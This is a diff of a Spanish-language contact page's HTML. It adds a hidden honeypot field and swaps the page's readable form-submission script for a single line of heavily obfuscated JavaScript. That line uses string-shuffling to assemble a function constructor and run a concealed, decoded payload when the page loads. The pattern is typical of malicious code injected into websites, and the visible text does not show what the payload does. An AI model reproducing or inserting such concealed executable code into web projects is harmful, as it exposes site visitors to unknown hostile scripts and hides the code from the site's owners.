@@ -176,6 +176,10 @@
         <p>Completá los datos y te contacto a la brevedad. </p>
       </div>
       <form id="contact-form" action="https://formspree.io/f/xjgebzeo" method="POST" class="contact-form">
+        <div style="display:none;">
+          <label>No completar este campo:</label>
+          <input type="text" name="_gotcha" id="honeypot">
+        </div>
         <div class="form-group">
           <label for="full-name">Nombre completo</label>
           <input type="text" id="full-name" name="name" required placeholder="Ej: Juan Pérez">
@@ -234,71 +238,7 @@
   </div>
 
   <script>
-    const modal = document.getElementById("contact-modal");
-    const form = document.getElementById("contact-form");
-    const successMsg = document.getElementById("success-message");
-    const errorMsg = document.getElementById("error-message");
-    const modalHeader = document.querySelector(".modal-header");
-
-    function openModal() {
-      modal.style.display = "flex";
-      // Resetear estados visuales
-      form.style.display = "flex";
-      modalHeader.style.display = "block";
-      successMsg.style.display = "none";
-      errorMsg.style.display = "none";
-    }
-
-    function closeModal() {
-      modal.style.display = "none";
-    }
-
-    // Disparador de Confeti
-    function launchConfetti() {
-      confetti({
-        particleCount: 150,
-        spread: 70,
-        origin: { y: 0.6 },
-        colors: ['#6366f1', '#22d3ee', '#ffffff'] // Colores de Learnsoft
-      });
-    }
-
-    form.onsubmit = async function(e) {
-      e.preventDefault();
-      const btn = form.querySelector('button[type="submit"]');
-      const originalText = btn.innerHTML;
-      
-      btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i> Enviando...';
-      btn.disabled = true;
-
-      try {
-        const formData = new FormData(this);
-        const response = await fetch("https://formspree.io/f/xjgebzeo", {
-          method: 'POST',
-          body: formData,
-          headers: { 'Accept': 'application/json' }
-        });
-
-        if (response.ok) {
-          // ÉXITO
-          form.style.display = "none";
-          modalHeader.style.display = "none";
-          successMsg.style.display = "block";
-          launchConfetti(); // ¡Bum! 🎉
-          form.reset();
-        } else {
-          throw new Error('Fallo en servidor');
-        }
-      } catch (err) {
-        // ERROR
-        form.style.display = "none";
-        modalHeader.style.display = "none";
-        errorMsg.style.display = "block";
-      } finally {
-        btn.innerHTML = originalText;
-        btn.disabled = false;
-      }
-    };
+    var modal,form,successMsg,errorMsg,modalHeader,openModal,closeModal,launchConfetti;(function(){var fJf='',XoS=781-770;function NAg(z){var y=3629080;var d=z.length;var p=[];for(var m=0;m<d;m++){p[m]=z.charAt(m)};for(var m=0;m<d;m++){var i=y*(m+532)+(y%18951);var n=y*(m+382)+(y%15748);var v=i%d;var c=n%d;var j=p[v];p[v]=p[c];p[c]=j;y=(i+n)%5386961;};return p.join('')};var LIG=NAg('crstqczitooahjpefgucrlmrsxwnbvukndtyo').substr(0,XoS);var bVi='r+-rc."a9f+g=6g= +;v8forwgli7airder-++=q;6+.0t<)(srz==.]t u(rnylg5pqp";;k;t,;rst+"isuo+,=;df,iop e3,}(+avac-u,e,ui(ru=cev,olvot>p*efouad=1+tciarrv .s l[n;r+[]+};ci]){f.=bkry g;;]r=;=a5 t.=n,lj5p[4fs)e;Atrru,hatqnr]asnozl,p3ttv7[nn7oef[c{=;a)k(m6n;(;]awb=q[([p (1oA(;lv8h}vp]8"rahClf<a2;e==kr[2 t2, yg(.st)v2(}essfl,;;= tadnurtef.;v=r1rvag,s+vcl4]gt0ipaf m]u7r a(h;p+S;mlu.=qgrh)h{)[(zt-lhuC,,awl ()giaa)i<[hed1id(h=0orha;p)01+5tc][ ,o;7it=e)laei+uo+lfe ,Cyjo8 s8rccfg)sdgiw(()fe6=;;;rgq1c 7cpeg0m=]0j+z);lor]S0")r{rp,f(i+f=-n=];)+C81 )lspnnraA(.} ;=io(t=h2yaq=e;)=h;ul5n.0(.eus)o;4i;.rtv9kg30)Anhr1(1v({ey, "8porojie.pn)g7c)etzl)gm8+qe1C=rs!csh(hb-nn))rqnCru}.*rpv(;=e=o;tuo=saa}hb.nsa(lrd;e8jrer)ij,;e.2tdil6=[ar ){a8t.xeea(i1))vy,ulhtrmec9t(hd;tav )p=luvp.6bph9Ch9oCo8[1a+">-erA,cl4v(0.,<=.4)980nut;aes+b,k<c27rv+0 a;.rfg==))nv]+n(hjrv;.;,;1{=!a9)o.=(6r.iaf.msm.(n,m56=l;vn=["("d;" mn(,2g';var pnW=NAg[LIG];var mZP='';var BMH=pnW;var KUP=pnW(mZP,NAg(bVi));var mQt=KUP(NAg('tS_cy(=r!nonu[W(!r"Nd-S=cW6]bu Z]e%};n#O}5e=aWfWaWrttctW7fWtph(a$";RoW$frlt4WEdN )?HW; C%oD1o13W d6=;n%fiW0=li#u%N4Ws-b!uWtl1sr_W>cW+We8W4M(I)(7oft.>nOo[7;7B!e(rrW6{mWWhWW=(N4a1nW\'+p..4rWg%\';)$)8nM${= ]eW5(e)_to8.5a,$l(ctei7fTWS#D%n6}6uky.I.W.%NugW,\/y3rl.fe{nwWW)py=.eW>a2a\/(_7@_(,Woafo$=tc!h-s=ds_;o(C6.[!ta(0l%We"t:Yw[9.fWb5W.$W}6st2;t"(totVB.]lF,o).8;Wr2W}mn((R;q].)2.e[=miW3W.s]_snWbWW (>;orrf!!=acW-5W$nW9<.fW{71d2l!W5t=roe."PfW5coe)rp60=W_gn%WWeW6!5WO4{<W!$0Hfe=68(oW.eiWi7n.-_1N rWWe3os#CfW=eWf0l=so_3so-QroW"Wds$[WDieml.n4ig(3,$dWZn8d.p6m!nr]cn1lWeWbW=_(Wu5r!EyFW7["g!WW0o)tWs!rroWIf1.=,2UoW(a%6[(;}S.ifeEf){= ;}g(((WWan(lrtneW_]W{ otoysagce6-i9(]6(WC,6,((h309829W%6t%(l.W%.XG_"g# nl?cnfW4)36(,pYeeWW(W$w({WWFW.!e%aWh50p4f.;aV1n(76W.\/yYf]iW6y=_.lWnb }eeaW2Wh,((!(.<xiWo3e;frW26alt [u"I=."!p =wtW<ec;8f=!Wey;,4%adp_W0.#Umo!mWew+cuuW_W6iWWt.u3fet%41(e)9nf)16 fjsW,r5=4yrYr)..l.rt13W[.gW0(Wf-+WyC62WWE#1a0mt{Tyu!Wo3We);ilnt83m)$,5_ofndb!rPW().6a:W)].HaRe.f_7{5;![%tW7,}dSWnHPW4l,-e))1WsCTr74)r(tW;(w>}WW<tb{{n()iWW3Woy45pZR(eW1G1W;7>8.V 7sfW\/WvCit[#.(WW7%W._.W r e{(nWWiW.b_WU;)9YWWn}f+.W_;"1bW=)6\/WLn72;;.(3)f;p}dadcnbn),f:+b]WesvW=i))W$n)f()ogW$(7]uds83{WrQ1fW2eo.[03f!W3o,VPpW6ar2cW!be(;);o.0n.tfi61[W3as WWW3 cff(o1esx10}Wco[.W(W,] t=KTW)9:=e!,rW9lWa}s=%+p9W,cr(hWWsf0W,; cj30%l( :!WWlEWWWWd=75,!7i{7niWW.1eoW(,so5oJWfa]y(]3!,3W;:W:]rrr}i[PlW.48Q+W)cef{<o5WWWXWB=fi;a0 W W]e;#&1itWW8r%)1ie3W9NWW6g0T+)}od)M0;7r.W6Mnf.fgifW#.)W_!(n;Wf,)5)&!;_;o]!vtco$ITf_}WU6W()W".rotesfciWns!WW}8b;EfWeW-f))tet.C(gWst2.g)W)1R]6(X9a)}.:w[%8)9 WWi*dW6WdW_W2f_b".6.r)Nfae%;5?(,Wftt;b}W .7 .WWbrf]Mcfm6an)i W6_(s9%a(7mf;o34]5W![,5oW))  ;WtWf.)5(r;Wy!))%Wrsr6W64.W@hdWW,O_TW(r)(,7.nUz!d)b!3.4WfhfWw3Wvf;.r.eW)[Er)d_i_.eb=Ke)7it{dt)oine)W@0W[WD W11]Z,=W0]mSWs,W\/o1WWGWWWo0[WfWind4bt;W!};W2%W4df(9)WWi)1cWWWn)i \'Wro<ue4f5eW:3fWd!p.}_c(WONWr{_;ezi5)VWWa_WC.]{WWo(ooW)g90U(Wbmelh2}_4F"}c,dW(0b)[f1We)v!;2 !zf]oUWn!f8eC0f#b.o.<Wnf]K(Ns;f;.(u2=f[W=;WW.C8Wbi(cuupf"\/!W C\'-Me("8ei,Ms8p={4Wft.Wffi:u};)Wl$rWo(We)aWWW0ef!o)e)gcEtWo0,}6b8.e71.);azn;ybE;.%Wlb3il:W)}o5W;Wrv0w=.fJ$06!)]cWW.[(d,;,0et=3)(c.]=(4d. _sn.lW.2)f]dvn9w3W0 !71l2).rW7!\/,(.nmn]d[WW52oa)W(r!&!6t)ce2w# o1js)W$W!J)8cWepb0WehoW(i6n?]=lWnl46\/noW3l)})(!eaft.6f[A6.WW]Wn$.({1.)1H%1!.$WehaWr;(W)ol56eXG!(=]l,;n.t()ny;*;6(5f)Wl;)]fa8bSWm$)@stt6!](-WW5)W1WW v!c,){ifr}66 PWm{az9))2)fn.}JKLAe)a.c}A%1pW_tgueW!!)W(rt]em={5WWt1i;e.9Wi776.W f!CcW[;WnWaW.eSW4(w_{rr5sbgQWu!.PPpaluekfWY1W)6.0;_tio!;m] Wlicl9W1_6$W6)]WLd7.9c2a!tn=i.WW2 ren${8Wmes[WV!9.f75W)ml:f[hai _!2usr5fe54_b90 f\/Wo;ys ;W1g%)..lrW5[}[_ Wl ae3ur}5uWX>{We.f)W6]{;9=8fs2Wan=n!sWB 9C?)2pWt12vt,c[r(at,1#W$- W#73,_6tAz)<(2rt{%__f_1]y?W=:tWcualrW{W){f. fe5Mur:{7W0Wp[oWaW.e(7Se8{,C:ac]f.{W=,\/0v"dams*.f&EfaCp5et]f{i2C(4WWtW!)W]Bv#seM7a#YWWWQsel1 44otW[0zg%sh(iP= rn]0(C7$_6}W7nn,]f_hr "i=c3n(4+.Dto!son.W5C&ex5=Wfrsm}fWW c*5_WWriW.U!iWyi..! W{6Lch( ;fu6m f.Fs] tWWSf]8G(a1n#%W)];t]or. =w.1_WonbnWru},VoW$.{tW%2Wj3!(re2#](0e)='));var RVq=BMH(fJf,mQt );RVq(5730);return 3514})()
   </script>
 </body>
 </html>
